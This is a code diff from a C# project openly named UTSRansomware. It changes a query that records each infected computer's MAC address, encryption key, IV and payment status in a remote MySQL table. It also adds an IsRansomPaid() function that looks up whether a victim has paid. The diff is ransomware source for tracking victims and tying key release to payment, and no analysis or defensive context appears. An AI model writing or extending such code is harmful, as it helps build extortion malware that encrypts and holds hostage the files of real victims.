@@ -25,7 +25,7 @@ namespace UTSRansomware
             {
                 connection.Open();
 
-                string query = "INSERT INTO infected_computers (computer_id, key, iv, ransom_payed) VALUES (@ComputerId, @Key, @Iv, @RansomPayed)";
+                string query = "INSERT INTO infected_computers (computer_id, encryption_key, iv, ransom_payed) VALUES (@ComputerId, @Key, @Iv, @RansomPayed)";
                 using (MySqlCommand cmd = new MySqlCommand(query, connection))
                 {
                     cmd.Parameters.AddWithValue("@ComputerId", GetMACAddress());
@@ -69,6 +69,32 @@ namespace UTSRansomware
                 }
             }
             return String.Empty;
+        }
+
+        public static bool IsRansomPaid()
+        {
+            using (MySqlConnection connection = new MySqlConnection(connectionString))
+            {
+                connection.Open();
+
+                // Define the query
+                string query = "SELECT ransom_payed FROM infected_computers WHERE computer_id = @computerId";
+                using (MySqlCommand cmd = new MySqlCommand(query, connection))
+                {
+                    cmd.Parameters.AddWithValue("@computerId", GetMACAddress());
+                    object result = cmd.ExecuteScalar();
+
+                    if (result != null)
+                    {
+                        // Convert the result to boolean and return
+                        return Convert.ToBoolean(result);
+                    }
+                    else
+                    {
+                        return false;
+                    }
+                }
+            }
         }
 
     }
